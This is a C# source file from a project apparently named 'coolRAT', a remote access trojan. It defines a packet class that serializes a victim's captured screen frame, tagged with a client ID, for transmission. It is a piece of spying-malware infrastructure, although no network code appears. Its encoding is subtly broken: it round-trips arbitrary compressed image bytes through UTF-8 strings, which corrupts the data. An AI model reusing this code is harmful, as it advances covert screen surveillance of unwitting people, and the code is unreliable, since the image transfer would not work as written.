using Newtonsoft.Json;
using Newtonsoft.Json.Bson;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class ScreenFrame : Packet
    {
        [JsonIgnore]
        public Bitmap Frame;

        public string FrameSerialized;

        public ScreenFrame(Guid uniqueClientId, Bitmap frame) : base(uniqueClientId)
        {
            Frame = frame;
            Type = "ScreenFrame";
        }

        public new string Serialize()
        {
            byte[] frame = ImageCompressor.ToByteArray(Frame);
            FrameSerialized = Encoding.UTF8.GetString(frame);
            return JsonConvert.SerializeObject(this);
        }

        public static new ScreenFrame Deserialize(string packet_raw)
        {
            ScreenFrame framepacket = JsonConvert.DeserializeObject<ScreenFrame>(packet_raw);
            byte[] frame = Encoding.UTF8.GetBytes(framepacket.FrameSerialized);
            framepacket.FrameSerialized = null;
            framepacket.Frame = (Bitmap)ImageCompressor.FromByteArray(frame);
            return framepacket;
        }
    }
}
